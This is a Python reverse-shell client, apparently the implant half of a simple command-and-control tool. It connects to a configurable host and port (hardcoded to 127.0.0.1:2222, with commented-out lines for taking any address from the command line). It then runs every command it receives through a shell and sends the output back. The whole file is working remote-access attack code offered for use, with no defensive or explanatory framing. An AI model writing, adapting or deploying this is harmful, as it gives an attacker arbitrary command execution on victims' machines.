import socket
import subprocess
import os
import sys

def inbound():
    print('[*] Awaiting response...')
    message = ''
    while True:
        try:
            message=sock.recv(1024).decode()
            return message
        except Exception():
            sock.close()
            break

def outbound(message):
    response = str(message).encode()
    sock.send(response)

def session_handler():
    print(f'[*] Connecting to {host_ip}')
    sock.connect((host_ip, host_port))
    print(f'[*] Connected to {host_ip}')
    while True:
        try:
            message = inbound()
            print(f'[*] Message received - {message}')
            if message == 'exit':
                print('[-] The server has terminated the session')
                sock.close()
                break
            elif message.split(" ")[0] == 'cd':
                try: 
                    directory = str(message.split(" ")[1])
                    os.chdir(directory)
                    cur_dir = os.getcwd()
                    print(f'[*] Changed to {cur_dir}')
                    outbound(cur_dir)
                except FileNotFoundError:
                    outbound('[-] Invalid directory')
                    continue
            elif message == 'background':
                pass
            else:
                command = subprocess.Popen(message, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                output = command.stdout.read() + command.stderr.read()
                sock.send(output)

        except KeyboardInterrupt:
            print('[-] Keyboard interrupt issued')
            sock.close()
            break
        except Exception:
            sock.close()
            break

if __name__ == '__main__':
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    # set ip and port variables
    #host_ip = sys.argv[1]
    #host_port = int(sys.argv[2])
    host_ip = '127.0.0.1'
    host_port = 2222
    session_handler()